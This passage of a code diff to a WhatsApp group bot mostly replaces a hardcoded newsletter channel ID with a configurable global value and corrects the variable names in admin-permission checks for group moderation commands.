                   serverMessageId: 143
                 }
@@ -7754,7 +7791,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -7800,7 +7837,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -7846,7 +7883,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -7892,7 +7929,7 @@ case 'what': {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -7938,7 +7975,7 @@ if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} is 
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -7984,7 +8021,7 @@ case 'how': {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8030,7 +8067,7 @@ case 'rate': {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8084,7 +8121,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8132,7 +8169,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8180,7 +8217,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8228,7 +8265,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8276,7 +8313,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8324,7 +8361,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8372,7 +8409,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8420,7 +8457,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8468,7 +8505,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8516,7 +8553,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8564,7 +8601,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8612,7 +8649,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8660,7 +8697,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8708,7 +8745,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8761,7 +8798,7 @@ await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8813,7 +8850,7 @@ case 'photoleap': {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8861,7 +8898,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8879,7 +8916,7 @@ await XeonBotInc.relayMessage(m.chat, msgs.message, {})
     case 'sc': case 'script': case 'donate': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'sourcecode': {
 let me = m.sender
 let teks = `*「  ${global.botname} Script 」*\n\nYouTube: ${global.websitex}\nGitHub: ${global.botscript}\n\nHi @${me.split('@')[0]} 👋\nDont forget to donate yeah🍜 👇 https://i.ibb.co/y6XmZ2b/donate.png`
-sendXeonBotIncMessage(from, { 
+sendXeonBotIncMessage(m.chat, { 
 text: teks,
 mentions:[sender],
 contextInfo:{
@@ -9069,7 +9106,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9115,7 +9152,7 @@ contextInfo: {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9161,7 +9198,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9207,7 +9244,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9253,7 +9290,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9299,7 +9336,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9345,7 +9382,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9391,7 +9428,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9436,7 +9473,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9482,7 +9519,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9528,7 +9565,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9574,7 +9611,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9620,7 +9657,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9666,7 +9703,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9712,7 +9749,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9758,7 +9795,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9804,7 +9841,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9850,7 +9887,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10009,7 +10046,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10072,7 +10109,7 @@ https://cloud.google.com/translate/docs/languages
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10117,7 +10154,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10164,7 +10201,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10212,7 +10249,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10259,7 +10296,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10482,7 +10519,7 @@ if (!XeonTheCreator) return XeonStickOwner()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10669,7 +10706,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10764,7 +10801,7 @@ if (!text) return replygcxeon('Please provide a song name')
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10825,7 +10862,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10951,7 +10988,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -11004,7 +11041,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -11067,7 +11104,7 @@ break;
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -11115,7 +11152,7 @@ await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -11177,7 +11214,7 @@ await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -11229,7 +11266,7 @@ await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -11321,7 +11358,7 @@ let yts = require("yt-search")
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -11380,7 +11417,7 @@ ${resulw}`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -11515,7 +11552,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -11591,7 +11628,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -11812,7 +11849,7 @@ break
                 break
 			case 'editinfo':{
                 if (!m.isGroup) return XeonStickGroup()
-                if (!m.isAdmins && !XeonTheCreator) return XeonStickAdmin()
+                if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
                 if (!m.isBotAdmin) return XeonStickBotAdmin()
                 if (args[0] === 'open') {
                     await XeonBotInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygcxeon(`Successfully Opened Edit Group Info`))
@@ -11866,7 +11903,7 @@ break
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -11935,7 +11972,7 @@ XeonBotInc.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map
 break
 			case 'kickall': {
  if (!m.isGroup) return XeonStickGroup()
- if (!m.isAdmins && !XeonTheCreator) return XeonStickAdmin()
+ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
  if (!m.isBotAdmin) return XeonStickBotAdmin()
   const xeonkickall = (args[0] === 'numBut')
   ? text.replace(`${args[0]} `, '').split('|')
@@ -11999,7 +12036,7 @@ break
 			case 'ephemeral': {
                 if (!m.isGroup) return XeonStickGroup()
                 if (!m.isBotAdmin) return XeonStickBotAdmin()
-                if (!m.isAdmin) return XeonStickAdmin()
+                if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
                 if (args[0] === 'on') {
                     await XeonBotInc.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
                     await replygcxeon(`Done`)
@@ -12054,7 +12091,7 @@ break
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -12121,7 +12158,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -12151,8 +12188,8 @@ break
             break
 			case 'antipoll':{
             	if (!m.isGroup) return XeonStickGroup()
-if (!isBotAdmins) return XeonStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
+if (!m.isBotAdmin) return XeonStickBotAdmin()
+if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
                
                if (args[0] === 'on') {
                   db.groups[m.chat].antipoll = true
@@ -12208,7 +12245,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -12226,8 +12263,8 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             break
             case 'antisticker':{
             	if (!m.isGroup) return XeonStickGroup()
-if (!isBotAdmins) return XeonStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
+if (!m.isBotAdmin) return XeonStickBotAdmin()
+if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
                
                if (args[0] === 'on') {
                   db.groups[m.chat].antisticker = true
@@ -12283,7 +12320,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -12301,8 +12338,8 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             break
             case 'antiimage':{
             	if (!m.isGroup) return XeonStickGroup()
-if (!isBotAdmins) return XeonStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
+if (!m.isBotAdmin) return XeonStickBotAdmin()
+if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
                
                if (args[0] === 'on') {
                   db.groups[m.chat].antiimage = true
@@ -12358,7 +12395,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -12376,8 +12413,8 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             break
             case 'antivideo':{
             	if (!m.isGroup) return XeonStickGroup()
-if (!isBotAdmins) return XeonStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
+if (!m.isBotAdmin) return XeonStickBotAdmin()
+if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
                
                if (args[0] === 'on') {
                   db.groups[m.chat].antivideo = true
@@ -12433,7 +12470,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -12451,8 +12488,8 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             break
             case 'antivirtex': case 'antivirus':{
 		         if (!m.isGroup) return XeonStickGroup()
-if (!isBotAdmins) return XeonStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
+if (!m.isBotAdmin) return XeonStickBotAdmin()
+if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
                
                if (args[0] === 'on') {
                   db.groups[m.chat].antivirtex = true
@@ -12508,7 +12545,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -12580,7 +12617,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -12653,7 +12690,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -12726,7 +12763,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -12801,7 +12838,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -12876,7 +12913,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -12951,7 +12988,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13026,7 +13063,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13100,7 +13137,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13174,7 +13211,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13248,7 +13285,7 @@ if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13435,7 +13472,7 @@ if (!XeonTheCreator) return XeonStickOwner()
                   forwardingScore: 999,
                   isForwarded: true,
